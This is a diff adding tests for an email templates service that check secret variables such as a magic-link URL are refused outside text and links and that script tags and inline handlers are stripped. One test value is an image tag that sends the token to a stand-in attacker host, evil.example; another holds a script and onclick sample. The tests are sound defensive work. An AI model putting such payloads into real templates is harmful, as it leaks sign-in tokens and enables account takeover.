@@ -231,4 +231,50 @@ describe('Templates service', () => {
       expect(ctx.send).not.toHaveBeenCalled();
     });
   });
+
+  describe('hardening on save', () => {
+    beforeEach(() => {
+      service.register('end-users.magic-link', {
+        defaults: { subject: 'S', html: '<p>{{ url }}</p>', text: '{{ url }}' },
+        variables: ['email', { name: 'url', secret: true }],
+      });
+    });
+
+    it('lists secret variables by name like any other', async () => {
+      expect((await service.get('end-users.magic-link')).variables).toEqual(['email', 'url']);
+    });
+
+    it('refuses a secret variable outside text and links, naming it', async () => {
+      await expect(
+        service.update('end-users.magic-link', 'en', {
+          subject: 'S',
+          html: '<img src="https://evil.example/?t={{ url }}">',
+          text: '{{ url }}',
+        })
+      ).rejects.toThrow(/\{\{ url \}\}/);
+
+      expect(ctx.getRows()).toEqual([]);
+    });
+
+    it('stores the cleaned HTML and keeps a secret in a link', async () => {
+      const saved = await service.update('end-users.magic-link', 'en', {
+        subject: 'S',
+        html: '<script>x()</script><a href="{{ url }}" onclick="x()">Sign in</a>',
+        text: '{{ url }}',
+      });
+
+      expect(saved.html).toBe('<a href="{{ url }}">Sign in</a>');
+      expect(ctx.getRows()[0].html).toBe('<a href="{{ url }}">Sign in</a>');
+    });
+
+    it('does not restrict a variable that is not declared secret', async () => {
+      await expect(
+        service.update('end-users.reset-password', 'en', {
+          subject: 'S',
+          html: '<img src="https://example.com/{{ url }}">',
+          text: 'x',
+        })
+      ).resolves.toBeDefined();
+    });
+  });
 });
